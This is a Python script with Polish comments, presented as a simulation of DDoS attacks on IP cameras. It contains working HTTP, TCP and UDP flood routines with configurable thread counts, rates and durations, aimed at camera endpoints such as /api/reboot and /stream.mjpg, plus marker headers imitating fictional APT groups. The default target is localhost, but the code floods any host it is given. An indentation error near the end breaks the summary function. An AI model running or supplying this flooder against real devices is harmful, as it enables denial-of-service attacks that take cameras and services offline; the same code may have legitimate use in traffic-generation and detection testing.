#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Skrypt symulujący atak DDoS na kamery IP.
"""

import argparse
import logging
import random
import socket
import sys
import threading
import time
import queue
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Konfiguracja logowania
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('ddos_attack')

# Globalne statystyki
attack_stats = {
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'total_bytes_sent': 0,
    'start_time': None,
    'end_time': None
}

# Blokada dla synchronizacji dostępu do statystyk
stats_lock = threading.Lock()

# Kolejka dla rejestrowania szczegółowych informacji o ataku
log_queue = queue.Queue()

# User-Agent strings używane w ataku
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
    'DDoS-Bot/1.0',
    'SecurityScanner/2.0',
    'BotNet-Agent/1.0'
]

# Ścieżki URL do atakowania
TARGET_PATHS = [
    '/',
    '/login',
    '/api/status',
    '/api/stream',
    '/api/settings',
    '/api/snapshot',
    '/api/reboot',
    '/stream.mjpg',
    '/camera/live',
    '/config'
]


def parse_arguments():
    """Parsowanie argumentów wiersza poleceń."""
    parser = argparse.ArgumentParser(description='Symulacja ataku DDoS na kamery IP')
    parser.add_argument('--target', type=str, default='localhost:8000', help='Cel ataku (host:port)')
    parser.add_argument('--intensity', type=str, choices=['low', 'medium', 'high'], default='medium',
                        help='Intensywność ataku')
    parser.add_argument('--duration', type=int, default=30, help='Czas trwania ataku w sekundach')
    parser.add_argument('--threads', type=int, default=None, help='Liczba wątków (domyślnie zależna od intensywności)')
    parser.add_argument('--delay', type=float, default=None, help='Opóźnienie między żądaniami w ms')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout dla pojedynczego żądania')
    parser.add_argument('--method', type=str, choices=['HTTP', 'TCP', 'UDP', 'MIXED'], default='HTTP',
                        help='Metoda ataku')
    parser.add_argument('--log-file', type=str, help='Plik do zapisu logów')
    parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
    parser.add_argument('--apt-group', type=str, choices=['BlackNova', 'RedShift', 'CosmicSpider', 'None'], 
                      default='None', help='Symuluj atak konkretnej grupy APT')

    return parser.parse_args()


def get_attack_params(intensity):
    """
    Zwraca parametry ataku w zależności od intensywności.

    Args:
        intensity (str): Poziom intensywności (low, medium, high)

    Returns:
        dict: Parametry ataku
    """
    params = {
        'low': {
            'threads': 5,
            'delay': 100,  # ms
            'requests_per_thread': 10
        },
        'medium': {
            'threads': 20,
            'delay': 50,
            'requests_per_thread': 50
        },
        'high': {
            'threads': 50,
            'delay': 10,
            'requests_per_thread': 100
        }
    }

    return params.get(intensity, params['medium'])


def get_apt_specific_headers(apt_group):
    """
    Zwraca nagłówki charakterystyczne dla konkretnej grupy APT.

    Args:
        apt_group (str): Nazwa grupy APT

    Returns:
        dict: Słownik z nagłówkami
    """
    if apt_group == 'BlackNova':
        return {
            'User-Agent': 'BNC-Scanner/2.1',
            'X-Attack-ID': f'BNC-{int(time.time())}-{random.randint(1000, 9999)}',
            'X-Source-IP': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
            'X-Attack-Type': 'HTTP-FLOOD',
            'Connection': 'keep-alive'
        }
    elif apt_group == 'RedShift':
        return {
            'User-Agent': 'RS-Scanner/1.0',
            'X-RedShift-Operation': f'RSB-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
            'X-RS-Marker': hashlib.md5(str(time.time()).encode()).hexdigest()[:10],
            'Cache-Control': 'no-store',
            'Connection': 'close'
        }
    elif apt_group == 'CosmicSpider':
        return {
            'User-Agent': 'CS-Scanner/3.5',
            'X-CS-Operation': 'recon-phase',
            'X-CS-Target': f'target-{random.randint(1, 100)}',
            'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
            'Connection': 'keep-alive'
        }
    else:
        # Domyślne, losowe nagłówki
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }


def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id, apt_group='None'):
    """
    Wykonuje atak HTTP flood.

    Args:
        target_url (str): URL celu
        num_requests (int): Liczba żądań do wykonania
        delay_ms (int): Opóźnienie między żądaniami w milisekundach
        timeout (int): Timeout dla żądania
        worker_id (int): ID workera
        apt_group (str): Nazwa grupy APT do symulacji
    """
    local_stats = {
        'requests': 0,
        'successful': 0,
        'failed': 0,
        'bytes_sent': 0
    }

    for i in range(num_requests):
        try:
            # Wybór losowej ścieżki
            path = random.choice(TARGET_PATHS)
            url = f"http://{target_url}{path}"

            # Pobierz nagłówki specyficzne dla grupy APT
            headers = get_apt_specific_headers(apt_group)
            
            # Dodaj dodatkowe nagłówki dla identyfikacji workera
            headers['X-Worker-ID'] = f'worker-{worker_id}-request-{i}'

            # Wysłanie żądania
            start_time = time.time()
            response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
            elapsed = time.time() - start_time

            local_stats['requests'] += 1
            local_stats['successful'] += 1
            local_stats['bytes_sent'] += len(url) + sum(len(k) + len(v) for k, v in headers.items())

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'url': url,
                'status_code': response.status_code,
                'response_time': elapsed,
                'bytes_sent': local_stats['bytes_sent'],
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        except Exception as e:
            local_stats['requests'] += 1
            local_stats['failed'] += 1

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'url': url if 'url' in locals() else target_url,
                'error': str(e),
                'status': 'failed',
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
        if apt_group == 'BlackNova':
            # BlackNova używa bardzo małych opóźnień - bursty attack
            actual_delay = max(1, delay_ms / 10)
        elif apt_group == 'RedShift':
            # RedShift stosuje regularne opóźnienia
            actual_delay = delay_ms
        elif apt_group == 'CosmicSpider':
            # CosmicSpider stosuje zmienne opóźnienia
            actual_delay = delay_ms * random.uniform(0.5, 2.0)
        else:
            actual_delay = delay_ms

        if actual_delay > 0:
            time.sleep(actual_delay / 1000.0)

    # Aktualizacja globalnych statystyk
    with stats_lock:
        attack_stats['total_requests'] += local_stats['requests']
        attack_stats['successful_requests'] += local_stats['successful']
        attack_stats['failed_requests'] += local_stats['failed']
        attack_stats['total_bytes_sent'] += local_stats['bytes_sent']

    return local_stats


def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id, apt_group='None'):
    """
    Wykonuje atak TCP SYN flood.

    Args:
        target_host (str): Host celu
        target_port (int): Port celu
        num_requests (int): Liczba żądań
        delay_ms (int): Opóźnienie między żądaniami
        worker_id (int): ID workera
        apt_group (str): Nazwa grupy APT do symulacji
    """
    local_stats = {
        'requests': 0,
        'successful': 0,
        'failed': 0,
        'bytes_sent': 0
    }

    for i in range(num_requests):
        try:
            # Utworzenie socketu TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            # Próba połączenia (SYN)
            start_time = time.time()
            result = sock.connect_ex((target_host, target_port))
            elapsed = time.time() - start_time

            if result == 0:
                local_stats['successful'] += 1
                # Wysłanie minimalnych danych
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
                local_stats['bytes_sent'] += 50
            else:
                local_stats['failed'] += 1

            sock.close()
            local_stats['requests'] += 1

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'type': 'TCP_SYN',
                'target': f"{target_host}:{target_port}",
                'result': 'success' if result == 0 else 'failed',
                'response_time': elapsed,
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        except Exception as e:
            local_stats['requests'] += 1
            local_stats['failed'] += 1

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'type': 'TCP_SYN',
                'error': str(e),
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
        if apt_group == 'BlackNova':
            # BlackNova używa bardzo małych opóźnień
            actual_delay = max(1, delay_ms / 10)
        elif apt_group == 'RedShift':
            # RedShift stosuje regularne opóźnienia
            actual_delay = delay_ms
        elif apt_group == 'CosmicSpider':
            # CosmicSpider stosuje zmienne opóźnienia
            actual_delay = delay_ms * random.uniform(0.5, 2.0)
        else:
            actual_delay = delay_ms

        if actual_delay > 0:
            time.sleep(actual_delay / 1000.0)

    # Aktualizacja globalnych statystyk
    with stats_lock:
        attack_stats['total_requests'] += local_stats['requests']
        attack_stats['successful_requests'] += local_stats['successful']
        attack_stats['failed_requests'] += local_stats['failed']
        attack_stats['total_bytes_sent'] += local_stats['bytes_sent']

    return local_stats


def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id, apt_group='None'):
    """
    Wykonuje atak UDP flood.

    Args:
        target_host (str): Host celu
        target_port (int): Port celu
        num_requests (int): Liczba żądań
        delay_ms (int): Opóźnienie między żądaniami
        worker_id (int): ID workera
        apt_group (str): Nazwa grupy APT do symulacji
    """
    local_stats = {
        'requests': 0,
        'successful': 0,
        'failed': 0,
        'bytes_sent': 0
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(num_requests):
        try:
            # Generowanie losowych danych
            data_size = random.randint(64, 1024)
            
            # Modyfikacja danych dla grup APT
            if apt_group == 'BlackNova':
                # BlackNova dodaje swój identyfikator
                prefix = b"BNC-FLOOD-"
                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
                data = prefix + random_bytes
            elif apt_group == 'RedShift':
                # RedShift używa charakterystycznego wzorca
                prefix = b"RSB-UDP-FLOOD-"
                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
                data = prefix + random_bytes
            elif apt_group == 'CosmicSpider':
                # CosmicSpider dodaje swój marker
                prefix = b"CS-PAYLOAD-"
                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
                data = prefix + random_bytes
            else:
                # Standardowe losowe dane
                data = bytes([random.randint(0, 255) for _ in range(data_size)])

            # Wysłanie pakietu UDP
            sock.sendto(data, (target_host, target_port))

            local_stats['requests'] += 1
            local_stats['successful'] += 1
            local_stats['bytes_sent'] += data_size

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'type': 'UDP_FLOOD',
                'target': f"{target_host}:{target_port}",
                'bytes_sent': data_size,
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        except Exception as e:
            local_stats['requests'] += 1
            local_stats['failed'] += 1

            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'worker_id': worker_id,
                'request_id': i,
                'type': 'UDP_FLOOD',
                'error': str(e),
                'apt_group': apt_group if apt_group != 'None' else None
            }
            log_queue.put(log_entry)

        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
        if apt_group == 'BlackNova':
            # BlackNova używa bardzo małych opóźnień
            actual_delay = max(1, delay_ms / 5)
        elif apt_group == 'RedShift':
            # RedShift stosuje regularne opóźnienia
            actual_delay = delay_ms
        elif apt_group == 'CosmicSpider':
            # CosmicSpider stosuje zmienne opóźnienia
            actual_delay = delay_ms * random.uniform(0.5, 2.0)
        else:
            actual_delay = delay_ms

        if actual_delay > 0:
            time.sleep(actual_delay / 1000.0)

    sock.close()

    # Aktualizacja globalnych statystyk
    with stats_lock:
        attack_stats['total_requests'] += local_stats['requests']
        attack_stats['successful_requests'] += local_stats['successful']
        attack_stats['failed_requests'] += local_stats['failed']
        attack_stats['total_bytes_sent'] += local_stats['bytes_sent']

    return local_stats


def log_writer(log_file=None, verbose=False):
    """
    Zapisuje logi do pliku i/lub konsoli.

    Args:
        log_file (str): Ścieżka do pliku logów
        verbose (bool): Czy wyświetlać szczegółowe logi
    """
    file_handle = None
    if log_file:
        file_handle = open(log_file, 'w')
        file_handle.write("timestamp,worker_id,request_id,type,target,status,response_time,bytes_sent,error,apt_group\n")

    while True:
        try:
            log_entry = log_queue.get(timeout=1)

            if log_entry is None:  # Sygnał zakończenia
                break

            # Formatowanie wpisu
            csv_line = f"{log_entry.get('timestamp', '')},{log_entry.get('worker_id', '')},"
            csv_line += f"{log_entry.get('request_id', '')},{log_entry.get('type', 'HTTP')},"
            csv_line += f"{log_entry.get('target', log_entry.get('url', ''))},"
            csv_line += f"{log_entry.get('status', log_entry.get('result', 'unknown'))},"
            csv_line += f"{log_entry.get('response_time', '')},{log_entry.get('bytes_sent', '')},"
            csv_line += f"{log_entry.get('error', '')},{log_entry.get('apt_group', 'None')}\n"

            if file_handle:
                file_handle.write(csv_line)
                file_handle.flush()

            if verbose:
                logger.debug(f"Log entry: {log_entry}")

        except queue.Empty:
            continue
        except Exception as e:
            logger.error(f"Błąd w log_writer: {e}")

    if file_handle:
        file_handle.close()


def display_progress(duration, apt_group='None'):
    """
    Wyświetla pasek postępu ataku.

    Args:
        duration (int): Czas trwania ataku w sekundach
        apt_group (str): Nazwa symulowanej grupy APT
    """
    start_time = time.time()

    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        progress = (elapsed / duration) * 100

        with stats_lock:
            total_reqs = attack_stats['total_requests']
            success_reqs = attack_stats['successful_requests']
            failed_reqs = attack_stats['failed_requests']
            bytes_sent = attack_stats['total_bytes_sent']

        # Obliczanie szybkości
        rate = total_reqs / elapsed if elapsed > 0 else 0
        bandwidth = bytes_sent / elapsed if elapsed > 0 else 0

        # Dodaj informację o grupie APT jeśli ją symulujemy
        apt_info = ""
        if apt_group != 'None':
            apt_info = f" | APT Group: {apt_group}"

        sys.stdout.write(
            f"\rProgress: {progress:5.1f}% | Requests: {total_reqs} | Success: {success_reqs} | Failed: {failed_reqs} | Rate: {rate:.1f} req/s | Bandwidth: {bandwidth / 1024:.1f} KB/s{apt_info}")
        sys.stdout.flush()

        time.sleep(0.5)

    print("\n")


def main():
    """Główna funkcja programu."""
    args = parse_arguments()

    # Parsowanie celu
    if ':' in args.target:
        target_host, target_port = args.target.split(':')
        target_port = int(target_port)
    else:
        target_host = args.target
        target_port = 80

    # Pobranie parametrów ataku
    attack_params = get_attack_params(args.intensity)

    # Nadpisanie parametrów jeśli podano w argumentach
    num_threads = args.threads if args.threads else attack_params['threads']
    delay_ms = args.delay if args.delay else attack_params['delay']
    requests_per_thread = attack_params['requests_per_thread']

    # Modyfikacje parametrów dla grup APT
    if args.apt_group == 'BlackNova':
        # BlackNova używa większej liczby wątków i mniejszych opóźnień
        if not args.threads:
            num_threads = int(num_threads * 1.5)  # 50% więcej wątków
        if not args.delay:
            delay_ms = max(1, delay_ms / 5)  # 5x krótsze opóźnienie
    elif args.apt_group == 'RedShift':
        # RedShift używa bardziej przewidywalnych ataków
        requests_per_thread = int(requests_per_thread * 1.2)  # 20% więcej żądań
    elif args.apt_group == 'CosmicSpider':
        # CosmicSpider używa zmiennego tempa
        if not args.threads:
            num_threads = num_threads + random.randint(-3, 5)  # Losowa zmiana liczby wątków

    # Wyświetlenie informacji o ataku
    print("=== DDoS Attack Simulation ===")
    print(f"Target: {args.target}")
    print(f"Method: {args.method}")
    print(f"Intensity: {args.intensity}")
    print(f"Duration: {args.duration} seconds")
    print(f"Threads: {num_threads}")
    print(f"Delay: {delay_ms}ms")
    print(f"Requests per thread: {requests_per_thread}")
    
    if args.apt_group != 'None':
        print(f"Simulating APT Group: {args.apt_group}")
        
    print("==============================\n")

    # Inicjalizacja statystyk
    attack_stats['start_time'] = datetime.now()

    # Uruchomienie wątku zapisującego logi
    log_thread = threading.Thread(
        target=log_writer,
        args=(args.log_file, args.verbose),
        daemon=True
    )
    log_thread.start()

    # Uruchomienie wątku wyświetlającego postęp
    progress_thread = threading.Thread(
        target=display_progress,
        args=(args.duration, args.apt_group),
        daemon=True
    )
    progress_thread.start()

    # Utworzenie puli wątków
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []

        # Uruchomienie workerów w zależności od metody ataku
        for i in range(num_threads):
            if args.method == 'HTTP':
                future = executor.submit(
                    http_flood_worker,
                    args.target,
                    requests_per_thread,
                    delay_ms,
                    args.timeout,
                    i,
                    args.apt_group  # Przekazujemy grupę APT
                )
            elif args.method == 'TCP':
                future = executor.submit(
                    tcp_flood_worker,
                    target_host,
                    target_port,
                    requests_per_thread,
                    delay_ms,
                    i,
                    args.apt_group  # Przekazujemy grupę APT
                )
            elif args.method == 'UDP':
                future = executor.submit(
                    udp_flood_worker,
                    target_host,
                    target_port,
                    requests_per_thread,
                    delay_ms,
                    i,
                    args.apt_group  # Przekazujemy grupę APT
                )
            elif args.method == 'MIXED':
                # Mieszany atak - różne metody dla różnych wątków
                if args.apt_group == 'BlackNova':
                    # BlackNova preferuje HTTP i TCP
                    attack_types = ['HTTP', 'HTTP', 'TCP']
                elif args.apt_group == 'RedShift':
                    # RedShift używa wszystkich metod z preferencją dla HTTP
                    attack_types = ['HTTP', 'HTTP', 'TCP', 'UDP']
                elif args.apt_group == 'CosmicSpider':
                    # CosmicSpider używa bardziej UDP i TCP
                    attack_types = ['HTTP', 'TCP', 'TCP', 'UDP', 'UDP']
                else:
                    attack_types = ['HTTP', 'TCP', 'UDP']
                    
                attack_type = random.choice(attack_types)
                
                if attack_type == 'HTTP':
                    future = executor.submit(
                        http_flood_worker,
                        args.target,
                        requests_per_thread,
                        delay_ms,
                        args.timeout,
                        i,
                        args.apt_group
                    )
                elif attack_type == 'TCP':
                    future = executor.submit(
                        tcp_flood_worker,
                        target_host,
                        target_port,
                        requests_per_thread,
                        delay_ms,
                        i,
                        args.apt_group
                    )
                else:
                    future = executor.submit(
                        udp_flood_worker,
                        target_host,
                        target_port,
                        requests_per_thread,
                        delay_ms,
                        i,
                        args.apt_group
                    )

            futures.append(future)

        # Oczekiwanie na zakończenie wszystkich wątków lub upływ czasu
        start_time = time.time()
        while time.time() - start_time < args.duration:
            time.sleep(0.5)
            # Sprawdzenie czy wszystkie wątki zakończyły pracę
            if all(future.done() for future in futures):
                break

        # Anulowanie pozostałych zadań
        for future in futures:
            if not future.done():
                future.cancel()

    # Zakończenie ataku
    attack_stats['end_time'] = datetime.now()

    # Sygnał zakończenia dla wątku logującego
    log_queue.put(None)
    log_thread.join(timeout=2)

    # Oczekiwanie na zakończenie wyświetlania postępu
    time.sleep(1)

    # Wyświetlenie podsumowania
    display_summary(args.apt_group)


def display_summary(apt_group='None'):
    """
    Wyświetla podsumowanie ataku.
    
    Args:
        apt_group (str): Nazwa symulowanej grupy APT
    """
    duration = (attack_stats['end_time'] - attack_stats['start_time']).total_seconds()

    print("\n=== Attack Summary ===")
    print(f"Start time: {attack_stats['start_time']}")
    print(f"End time: {attack_stats['end_time']}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Total requests: {attack_stats['total_requests']}")
    print(f"Successful requests: {attack_stats['successful_requests']}")
    print(f"Failed requests: {attack_stats['failed_requests']}")
    print(
        f"Success rate: {(attack_stats['successful_requests'] / attack_stats['total_requests'] * 100) if attack_stats['total_requests'] > 0 else 0:.2f}%")
    print(f"Average request rate: {attack_stats['total_requests'] / duration if duration > 0 else 0:.2f} req/s")
    print(f"Total data sent: {attack_stats['total_bytes_sent'] / 1024:.2f} KB")
    print(f"Average bandwidth: {attack_stats['total_bytes_sent'] / duration / 1024 if duration > 0 else 0:.2f} KB/s")
    
if apt_group != 'None':
        print(f"APT Group: {apt_group}")
        
        if apt_group == 'BlackNova':
            print("Attack Profile: High-Rate Flooding with Minimal Delays")
            print("Characteristic: Aggressive, Multi-Vector with Custom Headers")
        elif apt_group == 'RedShift':
            print("Attack Profile: Consistent Rate Attack with Regular Patterns")
            print("Characteristic: Custom Identifiers, Coordinated Request Timing")
        elif apt_group == 'CosmicSpider':
            print("Attack Profile: Variable Rate with Unpredictable Patterns")
            print("Characteristic: Signature Markers in Traffic, Complex Distribution")
    
print("=====================")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attack_stats['end_time'] = datetime.now()
        display_summary()
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        sys.exit(1)